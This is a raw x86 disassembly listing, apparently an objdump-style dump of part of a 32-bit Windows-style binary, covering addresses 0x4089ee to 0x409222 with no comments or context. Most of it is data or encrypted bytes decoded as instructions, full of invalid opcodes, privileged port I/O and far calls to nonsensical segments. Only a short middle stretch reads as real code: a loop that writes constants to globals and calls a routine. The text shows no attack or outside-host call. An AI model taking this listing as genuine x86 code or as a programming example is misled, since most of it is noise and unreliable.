  4089ee:	sub    DWORD PTR [esi-0x4],0xffffffad
  4089f2:	inc    ebx
  4089f3:	inc    esp
  4089f4:	outs   dx,BYTE PTR ds:[esi]
  4089f5:	sub    BYTE PTR [ecx+0x419fde14],cl
  4089fb:	pusha  
  4089fc:	push   cs
  4089fd:	inc    ebx
  4089fe:	ror    al,0xd3
  408a01:	clc    
  408a02:	xor    eax,0xa90d05c8
  408a07:	(bad)  
  408a08:	lahf   
  408a09:	sar    DWORD PTR [edx+0x1e],cl
  408a0c:	stos   BYTE PTR es:[edi],al
  408a0d:	fnstsw WORD PTR [ebx+0x289f7278]
  408a13:	(bad)  
  408a14:	adc    DWORD PTR [eax],edx
  408a16:	add    eax,0x37dda887
  408a1b:	sub    DWORD PTR [edx-0x48],esi
  408a1e:	and    cl,BYTE PTR [eax+0x32]
  408a21:	dec    eax
  408a22:	sbb    edi,esi
  408a24:	adc    DWORD PTR [ebx],esi
  408a26:	jl     0x408a80
  408a28:	push   ebx
  408a29:	lea    ebp,[edi+0x271d21fa]
  408a2f:	push   edi
  408a30:	aad    0x5b
  408a32:	add    BYTE PTR [edx+0x5f],bl
  408a35:	xchg   BYTE PTR [edi-0x26],dl
  408a38:	xrelease xchg BYTE PTR [edi],al
  408a3b:	xchg   esi,eax
  408a3c:	adc    eax,0xf8d5db81
  408a41:	rol    edx,cl
  408a43:	or     DWORD PTR [ebx],esp
  408a45:	inc    edi
  408a46:	jecxz  0x4089fa
  408a48:	fxch   st(7)
  408a4a:	add    al,0xb8
  408a4c:	jl     0x408a42
  408a4e:	xor    BYTE PTR [esi-0x51],bl
  408a51:	xor    al,0x8e
  408a53:	pop    es
  408a54:	sub    al,0xb
  408a56:	jg     0x408a96
  408a58:	mov    esi,0x182b7a60
  408a5d:	sahf   
  408a5e:	mov    cl,0x60
  408a60:	or     DWORD PTR [ecx+0x44],ebp
  408a63:	dec    esi
  408a64:	add    DWORD PTR [esi+0x2],eax
  408a67:	jmp    0x4e4d5fea
  408a6c:	aam    0xfe
  408a6e:	movsx  ebp,BYTE PTR [esi+0x6d]
  408a72:	and    ebx,DWORD PTR [eax+0x21]
  408a75:	inc    ebx
  408a76:	adc    DWORD PTR [edi-0x3],ecx
  408a79:	jmp    0x408a2a
  408a7b:	cmp    DWORD PTR [edx-0x30b4e38a],edi
  408a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a82:	mov    dh,bh
  408a84:	xchg   esp,eax
  408a85:	ret    0xdec8
  408a88:	xor    eax,0x9250c7cb
  408a8d:	hlt    
  408a8e:	inc    edx
  408a8f:	stos   BYTE PTR es:[edi],al
  408a90:	and    edi,eax
  408a92:	das    
  408a93:	mov    dh,0x20
  408a95:	sub    eax,0xb6b1b71d
  408a9a:	mov    ah,0x79
  408a9c:	int    0xf5
  408a9e:	mov    eax,0x86000df3
  408aa3:	or     dh,BYTE PTR [ebx+0x5a2a225b]
  408aa9:	or     BYTE PTR [edx],ch
  408aab:	icebp  
  408aac:	(bad)
  408ab0:	retf   
  408ab1:	fs mov esp,0x67a7e4d1
  408ab7:	mov    cl,0x1e
  408ab9:	out    0xd,al
  408abb:	jbe    0x408b2e
  408abd:	mov    BYTE PTR [ebp+0x20],bl
  408ac0:	mov    cl,0x20
  408ac2:	xchg   ecx,eax
  408ac3:	mov    ds:0xb92a5994,al
  408ac8:	pusha  
  408ac9:	cwde   
  408aca:	dec    eax
  408acb:	adc    ch,dl
  408acd:	jo     0x408ac1
  408acf:	jnp    0x408ad1
  408ad1:	mov    eax,0x53978cbe
  408ad6:	mov    dl,0x58
  408ad8:	shl    BYTE PTR [eax+0x36e19f6f],cl
  408ade:	mov    esp,0x5acf5790
  408ae3:	adc    ebx,DWORD PTR [bp+si+0x79]
  408ae7:	push   ss
  408ae8:	mov    ebp,0x59dfefca
  408aed:	imul   eax,DWORD PTR [edx+0x13b52134],0xffffff98
  408af4:	or     bh,BYTE PTR [edx-0x6be2927b]
  408afa:	xor    BYTE PTR [eax+0x49ee72b9],dl
  408b00:	xchg   esp,eax
  408b01:	mov    esp,0xfe0cbc9
  408b06:	enter  0x1ab8,0xd5
  408b0a:	popa   
  408b0b:	hlt    
  408b0c:	inc    esi
  408b0d:	mov    ah,0x15
  408b0f:	out    0x5b,eax
  408b11:	aam    0x95
  408b13:	addr16 (bad) 
  408b16:	sbb    BYTE PTR [ebp+0x25],bl
  408b19:	pop    edx
  408b1a:	lods   al,BYTE PTR ds:[esi]
  408b1b:	mov    dh,0xdc
  408b1d:	bnd jmp 0xb4d68526
  408b23:	lods   eax,DWORD PTR ds:[esi]
  408b24:	xchg   edi,eax
  408b25:	pop    edx
  408b26:	in     eax,dx
  408b27:	stc    
  408b28:	nop
  408b29:	test   eax,0xf2b76a3f
  408b2e:	jae    0x408b15
  408b30:	mov    cl,0x8c
  408b32:	and    BYTE PTR [ecx-0x74],0xae
  408b36:	out    dx,eax
  408b37:	clc    
  408b38:	pushf  
  408b39:	mov    eax,ds:0x305d066a
  408b3e:	jo     0x408b99
  408b40:	sar    ebx,1
  408b42:	fisttp QWORD PTR [edi-0x15]
  408b45:	repnz data16 mov ch,bl
  408b49:	xlat   BYTE PTR ds:[ebx]
  408b4a:	call   0x54e4e5b9
  408b4f:	inc    edi
  408b50:	mov    edi,DWORD PTR [edx+0x5e]
  408b53:	pop    esi
  408b54:	stos   DWORD PTR es:[edi],eax
  408b55:	out    0x4f,al
  408b57:	and    eax,0x9958eb20
  408b5c:	outs   dx,DWORD PTR ds:[esi]
  408b5d:	popf   
  408b5e:	out    0x5,al
  408b60:	adc    eax,0xb3c8671b
  408b65:	adc    DWORD PTR [esi+0x2],ebx
  408b68:	scas   eax,DWORD PTR es:[edi]
  408b69:	addr16 pop esi
  408b6b:	lahf   
  408b6c:	jge    0x408b6a
  408b6e:	pusha  
  408b6f:	add    ah,bl
  408b71:	fpatan 
  408b73:	xchg   BYTE PTR [ecx-0x45],al
  408b76:	ret    0x12df
  408b79:	dec    ebp
  408b7a:	loope  0x408bf8
  408b7c:	shl    ah,cl
  408b7e:	inc    edi
  408b7f:	mov    edi,0xb8c8795e
  408b84:	jne    0x408bb8
  408b86:	sub    ch,BYTE PTR [ecx]
  408b88:	jl     0x408bd6
  408b8a:	dec    esi
  408b8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b8c:	mov    ds:0xa9ae24b9,eax
  408b91:	sbb    cl,BYTE PTR [ecx-0x3b]
  408b94:	adc    dh,BYTE PTR [edi+0x73bcfd96]
  408b9a:	and    al,0x35
  408b9c:	out    dx,eax
  408b9d:	push   edx
  408b9e:	(bad)  
  408ba0:	ret    0x3d13
  408ba3:	sub    esi,ebp
  408ba5:	mov    ds:0x72e963a0,eax
  408baa:	ret    
  408bab:	add    al,0x1e
  408bad:	cwde   
  408bae:	or     ebp,DWORD PTR [ebp-0x7c0bc0bb]
  408bb4:	outs   dx,DWORD PTR ds:[esi]
  408bb5:	rol    BYTE PTR ds:0x7bc7fd4e,cl
  408bbb:	cdq    
  408bbc:	stos   DWORD PTR es:[edi],eax
  408bbd:	pushf  
  408bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bbf:	retf   0xfe1d
  408bc2:	jae    0x408c42
  408bc4:	pop    ebx
  408bc5:	iret   
  408bc6:	cmp    BYTE PTR [ebp-0x590227d],al
  408bcc:	or     BYTE PTR [ecx],0xbe
  408bcf:	mov    ax,WORD PTR [edx+ebp*2-0x18c00cee]
  408bd7:	rol    DWORD PTR [ebp-0x5a],0x7b
  408bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bdc:	stos   BYTE PTR es:[edi],al
  408bdd:	xchg   BYTE PTR [ebx],bl
  408bdf:	or     bl,cl
  408be1:	dec    edx
  408be2:	repz xchg esi,eax
  408be4:	ins    BYTE PTR es:[edi],dx
  408be5:	jnp    0x408bc9
  408be7:	hlt    
  408be8:	pop    edx
  408be9:	stos   DWORD PTR es:[edi],eax
  408bea:	mov    ch,0xc9
  408bec:	fst    DWORD PTR [esi]
  408bee:	das    
  408bef:	add    al,0x17
  408bf1:	idiv   BYTE PTR [ecx+0x24]
  408bf4:	mov    cl,0x9f
  408bf6:	mov    dh,0xc9
  408bf8:	and    eax,0xbcaf5ab4
  408bfd:	test   BYTE PTR [edi-0x62],al
  408c00:	pop    edx
  408c01:	shl    DWORD PTR [edi+0x60a5f876],cl
  408c07:	mov    cl,BYTE PTR [edi+0xe]
  408c0a:	test   al,0x4
  408c0c:	loopne 0x408c01
  408c0e:	and    BYTE PTR [ebp+0x5a52df69],ch
  408c14:	push   ds
  408c15:	sub    ch,BYTE PTR [edx]
  408c17:	cs jnp 0x408c67
  408c1a:	dec    edi
  408c1b:	push   ecx
  408c1c:	lahf   
  408c1d:	mov    bl,0x4d
  408c1f:	ret    
  408c20:	xor    eax,0xc421ecd4
  408c25:	retf   
  408c26:	out    0xe1,al
  408c28:	loope  0x408bfb
  408c2a:	jp     0x408c2d
  408c2c:	sbb    al,0xd1
  408c2e:	push   es
  408c2f:	call   0x6ce72abc
  408c34:	imul   ecx,DWORD PTR [ecx+0x61],0xffffffaa
  408c38:	pop    edi
  408c39:	push   ebp
  408c3a:	jmp    0xc16b5103
  408c3f:	shr    BYTE PTR [edi-0x37],cl
  408c42:	mov    ecx,0x5506c355
  408c47:	or     edi,DWORD PTR [edi+0x3b]
  408c4a:	test   al,0xaf
  408c4c:	call   0x850f:0x16924724
  408c53:	inc    ecx
  408c54:	add    BYTE PTR [eax],al
  408c56:	add    BYTE PTR [ecx+0x41497e],ah
  408c5c:	mov    eax,DWORD PTR [eax]
  408c5e:	mov    DWORD PTR ds:0x4346c3,0x3b52
  408c68:	mov    DWORD PTR [ebp-0x14],eax
  408c6b:	mov    eax,ds:0x414b86
  408c70:	mov    DWORD PTR ds:0x434687,0x120a
  408c7a:	mov    eax,DWORD PTR [eax]
  408c7c:	mov    DWORD PTR ds:0x4346b7,0x2b06
  408c86:	mov    DWORD PTR [ebp-0x18],eax
  408c89:	mov    DWORD PTR ds:0x4345ef,0x61a0
  408c93:	jmp    0x4092c1
  408c98:	mov    DWORD PTR ds:0x4346ff,0x680c
  408ca2:	cmp    edi,0x33c
  408ca8:	mov    DWORD PTR ds:0x434677,0x197
  408cb2:	jne    0x408fac
  408cb8:	jmp    0x408f40
  408cbd:	call   0x641af49f
  408cc2:	je     0x408d41
  408cc4:	fnsave [eax-0x52]
  408cc7:	inc    ecx
  408cc8:	leave  
  408cc9:	mov    cl,0xe5
  408ccb:	lock sbb DWORD PTR [ebp+eiz*8+0x7e],eax
  408cd0:	jle    0x408cb3
  408cd2:	js     0x408d52
  408cd4:	jle    0x408d28
  408cd6:	xor    al,0xe1
  408cd8:	sahf   
  408cd9:	pop    edx
  408cda:	push   ebp
  408cdb:	cs mov ebx,0x8caea8a4
  408ce1:	pop    edi
  408ce2:	pop    ecx
  408ce3:	int    0xf9
  408ce5:	mov    al,0x34
  408ce7:	and    eax,0x1e3dee62
  408cec:	dec    ebx
  408ced:	xor    al,0xb6
  408cef:	ror    DWORD PTR [ebp-0x11a4e86c],0x20
  408cf6:	xchg   edx,eax
  408cf7:	dec    esp
  408cf8:	ja     0x408d64
  408cfa:	cmp    BYTE PTR [ebp+ebp*1+0x328ee45e],bl
  408d01:	(bad)  
  408d02:	scas   al,BYTE PTR es:[edi]
  408d03:	in     al,0xe6
  408d05:	pop    eax
  408d06:	in     eax,0x5f
  408d08:	push   0xffffff98
  408d0a:	popf   
  408d0b:	test   BYTE PTR [edi+0x37],al
  408d0e:	cmc    
  408d0f:	jno    0x408cf5
  408d11:	dec    edi
  408d12:	lahf   
  408d13:	add    DWORD PTR [ebp-0x2b],ecx
  408d16:	push   edi
  408d17:	sub    BYTE PTR [ecx-0x1f9c09b4],ch
  408d1d:	pop    esp
  408d1e:	sbb    bh,BYTE PTR [ebp+0xa4410e5]
  408d24:	add    DWORD PTR [ecx+0x3dafdf9b],ebx
  408d2a:	popa   
  408d2b:	xlat   BYTE PTR ds:[ebx]
  408d2c:	dec    eax
  408d2d:	rol    esi,0x3b
  408d30:	push   es
  408d31:	sti    
  408d32:	rcr    BYTE PTR [ecx+0x1b],cl
  408d35:	jb     0x408d46
  408d37:	retf   0x7acc
  408d3a:	aad    0x84
  408d3c:	pop    ecx
  408d3d:	dec    edx
  408d3e:	test   al,0x57
  408d40:	pop    ds
  408d41:	inc    edx
  408d42:	mov    edx,0xc868126c
  408d47:	sub    DWORD PTR [ebx+0x1bf9cd],esi
  408d4d:	and    BYTE PTR [eax+eax*2-0x18351e04],0xfa
  408d55:	aad    0xfa
  408d57:	mov    al,0x74
  408d59:	mov    esp,edi
  408d5b:	rcl    BYTE PTR [ebx+edi*1-0x244e759d],1
  408d62:	data16 add cl,ah
  408d65:	xor    ch,cl
  408d67:	add    al,bl
  408d69:	iret   
  408d6a:	cmp    ebp,DWORD PTR [ebx]
  408d6c:	dec    esp
  408d6d:	pop    ebx
  408d6e:	push   esp
  408d6f:	mov    WORD PTR [eax-0x57],es
  408d72:	aam    0xba
  408d74:	in     eax,0xe2
  408d76:	xchg   ebp,eax
  408d77:	mov    ch,0xb8
  408d79:	or     eax,0x4e18483f
  408d7e:	xchg   ebx,eax
  408d7f:	mov    esp,0x858dafa2
  408d84:	in     eax,0xc9
  408d86:	retf   0x9008
  408d89:	stc    
  408d8a:	xchg   ebx,eax
  408d8b:	xor    eax,0x8b86bbf9
  408d90:	aaa    
  408d91:	mul    BYTE PTR [ebx]
  408d93:	(bad)  
  408d94:	or     al,0xff
  408d96:	jbe    0x408d20
  408d98:	rcl    BYTE PTR [ebp-0x58d1a32],0x1c
  408d9f:	push   esp
  408da0:	mov    ch,0xf1
  408da2:	nop
  408da3:	adc    al,0x8
  408da5:	pushf  
  408da6:	popf   
  408da7:	cmc    
  408da8:	mov    ds:0xac4e7a1a,al
  408dad:	imul   BYTE PTR [edi]
  408daf:	push   ebx
  408db0:	pop    eax
  408db1:	js     0x408d5e
  408db3:	imul   esi,ecx,0x37
  408db6:	imul   edi,DWORD PTR [esi+0x532844f1],0x34ccad71
  408dc0:	popa   
  408dc1:	sbb    BYTE PTR [ebp+0x27a7be85],cl
  408dc7:	xchg   DWORD PTR [esi-0xf],esi
  408dca:	and    bl,BYTE PTR ds:0x39d4d035
  408dd0:	add    ch,bl
  408dd2:	btc    DWORD PTR [edx+0x1d],edi
  408dd6:	inc    edi
  408dd7:	in     al,dx
  408dd8:	idiv   BYTE PTR [edi-0x3490d1bb]
  408dde:	mov    edx,DWORD PTR [esi+0x2c]
  408de1:	js     0x408dce
  408de3:	shr    BYTE PTR [esi+0x75a5cf4d],cl
  408de9:	sbb    ah,0x80
  408dec:	retf   0x549b
  408def:	js     0x408d98
  408df1:	fidiv  DWORD PTR [edi]
  408df3:	adc    DWORD PTR [edx+0x2f],eax
  408df6:	cwde   
  408df7:	xchg   ecx,eax
  408df8:	push   cs
  408df9:	popa   
  408dfa:	lods   al,BYTE PTR ds:[esi]
  408dfb:	push   esp
  408dfc:	inc    ecx
  408dfd:	nop
  408dfe:	cmc    
  408dff:	xchg   BYTE PTR ds:0xc6e12569,bh
  408e05:	aam    0x60
  408e07:	cmp    al,0x62
  408e09:	icebp  
  408e0a:	jge    0x408e2d
  408e0c:	or     esp,edi
  408e0e:	shl    BYTE PTR ds:0x9ea4e1e8,0x9a
  408e15:	push   ds
  408e16:	fstp   TBYTE PTR [eax+0x58]
  408e19:	hlt    
  408e1a:	cmp    ah,dl
  408e1c:	shr    DWORD PTR [ecx+0x46fcf42],0x1b
  408e23:	js     0x408e02
  408e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e26:	(bad)  [ebx+0x5c84fd01]
  408e2c:	jb     0x408e00
  408e2e:	xor    esp,DWORD PTR [eax+0x3]
  408e31:	or     DWORD PTR [ebx-0x7f],0x8abd7551
  408e38:	xchg   edx,eax
  408e39:	sbb    DWORD PTR [edx],0x9c52c567
  408e3f:	mov    esi,0xcf09102a
  408e44:	jmp    FWORD PTR [edi]
  408e46:	jmp    0x408e10
  408e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e49:	shl    BYTE PTR [ebp-0x3c],cl
  408e4c:	aas    
  408e4d:	add    edx,DWORD PTR [edi-0x7f4f5247]
  408e53:	sbb    al,0x9e
  408e55:	idiv   ch
  408e57:	jb     0x408e4d
  408e59:	retf   
  408e5a:	mov    ebx,0xa9871918
  408e5f:	in     eax,0x3b
  408e61:	mov    cl,0x74
  408e63:	sbb    DWORD PTR [edx+0x7c622f1c],edx
  408e69:	mov    esi,DWORD PTR [ebx-0x7b4e0d5b]
  408e6f:	clc    
  408e70:	sub    edi,DWORD PTR [edx-0x76341fa0]
  408e76:	sub    BYTE PTR [edx],0x39
  408e79:	and    al,0xf7
  408e7b:	idiv   bh
  408e7d:	pop    esi
  408e7e:	sub    al,0x99
  408e80:	jecxz  0x408e93
  408e82:	mov    dh,0xc4
  408e84:	xor    DWORD PTR [esi+0x70338024],edx
  408e8a:	in     al,0x45
  408e8c:	sbb    ah,BYTE PTR [esp+edx*8-0x774d822a]
  408e93:	sub    eax,0x69cd401e
  408e98:	fadd   DWORD PTR [edx-0x6]
  408e9b:	sbb    bl,BYTE PTR [esi+esi*2+0x4f]
  408e9f:	lock mov ds:0x9e145ebf,eax
  408ea5:	pop    edx
  408ea6:	lock popa 
  408ea8:	xchg   esi,eax
  408ea9:	aas    
  408eaa:	imul   DWORD PTR [esi+ebx*4]
  408ead:	xor    DWORD PTR [eax+esi*2-0x1df20594],esp
  408eb4:	mov    ebx,0x97e45776
  408eb9:	mov    ch,0xb9
  408ebb:	div    WORD PTR [ecx]
  408ebe:	mov    dh,0xe4
  408ec0:	shl    ah,0x88
  408ec3:	adc    DWORD PTR [edi-0x59a15b38],ecx
  408ec9:	icebp  
  408eca:	ficom  WORD PTR [ebp+0x14]
  408ecd:	dec    edx
  408ece:	sbb    DWORD PTR [ebx-0x66],0x5e8f1a1c
  408ed5:	jl     0x408e65
  408ed7:	jo     0x408ed4
  408ed9:	mov    dh,0x6b
  408edb:	ret    0x85ac
  408ede:	loop   0x408ed9
  408ee0:	mov    WORD PTR [ebp+0x604bba0a],fs
  408ee6:	gs retf 0xaa6
  408eea:	test   al,0x1e
  408eec:	in     al,dx
  408eed:	ret    
  408eee:	ret    
  408eef:	jmp    0x8d7afc8d
  408ef4:	in     eax,dx
  408ef5:	or     DWORD PTR [edi-0x629a5892],0x45
  408efc:	jno    0x408ecc
  408efe:	icebp  
  408eff:	xchg   dl,dh
  408f01:	push   esp
  408f02:	sbb    bh,BYTE PTR [edx+0x30]
  408f05:	jg     0x408ef2
  408f07:	dec    edi
  408f08:	out    dx,al
  408f09:	pushf  
  408f0a:	jecxz  0x408f22
  408f0c:	cmp    BYTE PTR [edi-0x54],bl
  408f0f:	add    ch,ah
  408f11:	ins    DWORD PTR es:[edi],dx
  408f12:	daa    
  408f13:	xor    cl,BYTE PTR [edx]
  408f15:	neg    DWORD PTR [ebp-0x49]
  408f18:	int    0x1b
  408f1a:	push   es
  408f1b:	jmp    0x27ea:0xc3368a49
  408f22:	mov    edx,0x8abf7ad0
  408f27:	xor    eax,DWORD PTR [ebp-0x2c57ea5f]
  408f2d:	lahf   
  408f2e:	pop    esi
  408f2f:	shl    BYTE PTR ds:0x227866ec,1
  408f35:	into   
  408f36:	push   0x63ead240
  408f3b:	bound  ebx,QWORD PTR [edi-0x7c55ae75]
  408f41:	or     BYTE PTR gs:[eax],al
  408f44:	mov    eax,DWORD PTR [ebp-0x8]
  408f47:	or     DWORD PTR ds:0x4346c3,0x434683
  408f51:	sub    eax,DWORD PTR [ebp+0x8]
  408f54:	push   eax
  408f55:	mov    eax,ds:0x434703
  408f5a:	or     DWORD PTR ds:0x4346c3,eax
  408f60:	mov    eax,DWORD PTR [ebp-0x4]
  408f63:	add    DWORD PTR ds:0x4345df,0x43464f
  408f6d:	add    eax,DWORD PTR [ebp+0x8]
  408f70:	sub    DWORD PTR ds:0x4346c7,0x434647
  408f7a:	push   eax
  408f7b:	dec    DWORD PTR ds:0x4345eb
  408f81:	call   0x4092e7
  408f86:	mov    DWORD PTR ds:0x4346b7,0x29a7
  408f90:	inc    DWORD PTR [ebp+0x8]
  408f93:	cmp    DWORD PTR [ebp+0x8],0x52
  408f97:	mov    DWORD PTR ds:0x4345ff,0x7d48
  408fa1:	jb     0x408f44
  408fa7:	jmp    0x4092c1
  408fac:	cmp    edi,0x1a2
  408fb2:	jne    0x40928f
  408fb8:	mov    DWORD PTR [ebp-0x60],0xf89c853a
  408fbf:	mov    eax,DWORD PTR [ebp-0x4]
  408fc2:	mov    DWORD PTR [ebp-0x5c],eax
  408fc5:	mov    eax,DWORD PTR [ebp-0x8]
  408fc8:	mov    DWORD PTR [ebp-0x58],eax
  408fcb:	mov    eax,DWORD PTR [ebp-0xc]
  408fce:	jmp    0x409256
  408fd3:	mov    BYTE PTR [edi],al
  408fd5:	xchg   esi,eax
  408fd6:	jno    0x408f69
  408fd8:	jno    0x409043
  408fda:	out    0xcb,eax
  408fdc:	fisttp DWORD PTR [esi+esi*1-0x68013cc2]
  408fe3:	das    
  408fe4:	loopne 0x409064
  408fe6:	jle    0x408fc9
  408fe8:	js     0x409068
  408fea:	jle    0x409036
  408fec:	sbb    al,0x33
  408fee:	sbb    DWORD PTR [ebp+0x30281ce0],esi
  408ff4:	pop    ebx
  408ff5:	pop    edi
  408ff6:	cs jp  0x408f95
  408ff9:	pusha  
  408ffa:	sbb    al,0xa6
  408ffc:	add    bh,BYTE PTR [edi+0x12]
  408fff:	push   cs
  409000:	xchg   edi,eax
  409001:	outs   dx,DWORD PTR ds:[esi]
  409002:	xchg   ebp,eax
  409003:	mov    DWORD PTR [ebx+0xd],ecx
  409006:	cli    
  409007:	fiadd  WORD PTR es:[esi+edx*8]
  40900b:	xchg   edx,eax
  40900c:	std    
  40900d:	or     ch,bh
  40900f:	sub    DWORD PTR [edi+0x6d235eb],edx
  409015:	push   es
  409016:	imul   eax,DWORD PTR [ebp+0x33],0x37fae421
  40901d:	cld    
  40901e:	mov    gs,WORD PTR [ebx-0x6a]
  409021:	mov    al,ds:0xc2a879fa
  409026:	(bad)  
  409027:	repnz cmp eax,0xe214e7fb
  40902d:	imul   DWORD PTR [ecx]
  40902f:	mov    ebp,0xc41d72a6
  409034:	inc    ecx
  409035:	adc    ecx,DWORD PTR [ecx+0x67bb9766]
  40903b:	rcr    BYTE PTR [esi-0x2dbb1279],0x18
  409042:	jne    0x40901b
  409044:	lock iret 
  409046:	sub    eax,0x11d3d1fd
  40904b:	xor    DWORD PTR [eax],edi
  40904d:	ins    DWORD PTR es:[edi],dx
  40904e:	pop    eax
  40904f:	mov    WORD PTR [esi+ecx*2],fs
  409052:	push   es
  409053:	add    ah,cl
  409055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409056:	xchg   DWORD PTR [eax+0x2da132b],ecx
  40905c:	dec    edx
  40905d:	outs   dx,BYTE PTR ds:[esi]
  40905e:	sti    
  40905f:	outs   dx,DWORD PTR ds:[esi]
  409060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409061:	inc    esp
  409062:	jno    0x409047
  409064:	stos   DWORD PTR es:[edi],eax
  409065:	or     esi,DWORD PTR [edx+0x7525f9b2]
  40906b:	sub    al,0x60
  40906d:	push   esp
  40906e:	mov    ecx,0x444e8f5d
  409073:	jno    0x4090b6
  409075:	xchg   BYTE PTR [ebx+esi*8+0x2e641d52],bh
  40907c:	add    ch,BYTE PTR ds:0x721f060c
  409082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409083:	and    BYTE PTR [esi-0x3a],0x42
  409087:	inc    edx
  409088:	fs add cl,bh
  40908b:	imul   edx,DWORD PTR [ecx+ecx*4],0x9
  40908f:	mov    WORD PTR [edi+0x11b5c778],fs
  409095:	jno    0x4090b0
  409097:	mov    ds:0x9b323379,eax
  40909c:	xchg   ebp,eax
  40909d:	cwde   
  40909e:	lock mov ebp,0xf9660a6a
  4090a4:	cmp    al,0x8
  4090a6:	ror    BYTE PTR [edi-0x5c4514cc],cl
  4090ac:	nop
  4090ad:	xlat   BYTE PTR ds:[ebx]
  4090ae:	loopne 0x4090c6
  4090b0:	mov    WORD PTR [edx-0x6],?
  4090b3:	inc    ebp
  4090b4:	mov    ds:0xea6ed7a9,al
  4090b9:	sub    BYTE PTR [eax-0x316abc31],bh
  4090bf:	popa   
  4090c0:	push   esp
  4090c1:	xor    DWORD PTR [edi+0x4104e52e],edi
  4090c7:	xchg   ebx,eax
  4090c8:	mov    ah,0x42
  4090ca:	xchg   ebp,eax
  4090cb:	push   esi
  4090cc:	out    dx,eax
  4090cd:	fidiv  WORD PTR [eax+0x4b1f279e]
  4090d3:	leave  
  4090d4:	rcr    bh,1
  4090d6:	stos   BYTE PTR es:[edi],al
  4090d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d8:	int3   
  4090d9:	das    
  4090da:	mov    eax,ds:0x2caa0764
  4090df:	aaa    
  4090e0:	xor    edi,DWORD PTR [ecx-0x48]
  4090e3:	pop    ebp
  4090e4:	or     DWORD PTR [ecx-0x262981d6],0x684a2906
  4090ee:	add    eax,edx
  4090f0:	fwait
  4090f1:	xor    eax,0xfe430960
  4090f6:	pop    esp
  4090f7:	xor    DWORD PTR ds:0x6f526eb,eax
  4090fd:	aaa    
  4090fe:	movsx  ebp,BYTE PTR [eax-0x4ee1fa08]
  409105:	daa    
  409106:	aam    0x50
  409108:	fwait
  409109:	push   edi
  40910a:	jmp    0x40915f
  40910c:	repz mov esi,0xb857698d
  409112:	xchg   edx,eax
  409113:	xchg   ebp,eax
  409114:	mov    al,ds:0x5d08a342
  409119:	sbb    edx,DWORD PTR [ebp-0x797cc568]
  40911f:	rol    BYTE PTR [ebx+eax*1+0xd],1
  409123:	mov    ebx,edi
  409125:	jge    0x40913f
  409127:	hlt    
  409128:	ud1    ecx,DWORD PTR [esi-0x781410b3]
  40912f:	pop    eax
  409130:	stc    
  409131:	push   edx
  409132:	pop    edi
  409133:	sbb    al,0xd0
  409135:	(bad)  
  409136:	jp     0x4090d2
  409138:	inc    edi
  409139:	xchg   esi,eax
  40913a:	mov    dh,0xd5
  40913c:	in     eax,dx
  40913d:	pushf  
  40913e:	jnp    0x4090cf
  409140:	lods   eax,DWORD PTR ds:[esi]
  409141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409142:	fcomp  DWORD PTR [ecx]
  409144:	call   0x7163:0x3c948647
  40914b:	or     BYTE PTR [edi],0x6f
  40914e:	xchg   BYTE PTR [esi+0xfccb1f],bh
  409154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409155:	sub    DWORD PTR [esi],edx
  409157:	pop    ebp
  409158:	das    
  409159:	mov    cl,0xc3
  40915b:	dec    ebp
  40915c:	mov    ch,0x51
  40915e:	mov    edx,edi
  409160:	mov    ds:0x32151d1e,al
  409165:	add    DWORD PTR [ebp+0x36ed4349],ebp
  40916b:	fs mov esi,0x8eb2824b
  409171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409172:	dec    ecx
  409173:	aas    
  409174:	in     eax,0x80
  409176:	addr16 mov edx,0x538483b3
  40917c:	mov    ebx,0x63cc91f1
  409181:	cdq    
  409182:	imul   ebp,DWORD PTR [edi+0x3db376f8],0xffffff80
  409189:	jl     0x4091cd
  40918b:	mov    ecx,0xf888604d
  409190:	jno    0x40918e
  409192:	mov    eax,ds:0xc999a268
  409197:	pop    es
  409198:	call   0x1ab0:0x1c2275f7
  40919f:	call   0xd7af:0xf8db0faa
  4091a6:	pop    esp
  4091a7:	pop    esi
  4091a8:	call   0x3fda:0xa71f1462
  4091af:	inc    esp
  4091b0:	or     BYTE PTR [ebx],dl
  4091b2:	not    BYTE PTR [edx+edi*8+0x77]
  4091b6:	sbb    BYTE PTR [ebp*2-0x270100cd],dl
  4091bd:	and    eax,0x98eeec02
  4091c2:	nop
  4091c3:	xor    al,0x83
  4091c5:	mov    ds,WORD PTR [eax+0x49c94e5c]
  4091cb:	or     ebx,DWORD PTR [eax+eax*8]
  4091ce:	lods   al,BYTE PTR ds:[esi]
  4091cf:	add    eax,0xb0aabfd0
  4091d4:	and    al,0x25
  4091d6:	pop    ebp
  4091d7:	lods   al,BYTE PTR ds:[esi]
  4091d8:	pop    ds
  4091d9:	popa   
  4091da:	push   esi
  4091db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091dc:	push   eax
  4091dd:	out    dx,al
  4091de:	inc    esp
  4091df:	int3   
  4091e0:	rcl    BYTE PTR [ebx+0x2ced2173],0xf3
  4091e7:	jo     0x4091f5
  4091e9:	xor    ecx,0xfffffff3
  4091ec:	fist   WORD PTR [edx-0xba75471]
  4091f2:	xchg   DWORD PTR [ecx-0x134377f8],ebx
  4091f8:	clc    
  4091f9:	int3   
  4091fa:	ror    dh,1
  4091fc:	paddw  mm6,mm0
  4091ff:	daa    
  409200:	dec    esp
  409201:	mov    edi,0x7b85f5ad
  409206:	test   BYTE PTR [ebp+0x7a],cl
  409209:	mov    dl,0x1d
  40920b:	outs   dx,DWORD PTR ds:[esi]
  40920c:	sbb    esi,esi
  40920e:	rcr    BYTE PTR [ebp-0x26],cl
  409211:	xlat   BYTE PTR ds:[ebx]
  409212:	push   edx
  409213:	sbb    ecx,DWORD PTR [eax+edi*2]
  409216:	mov    ecx,0x68ba9f35
  40921b:	inc    BYTE PTR [ecx]
  40921d:	sbb    eax,0x5b7eaa6
  409222:	dec    esp
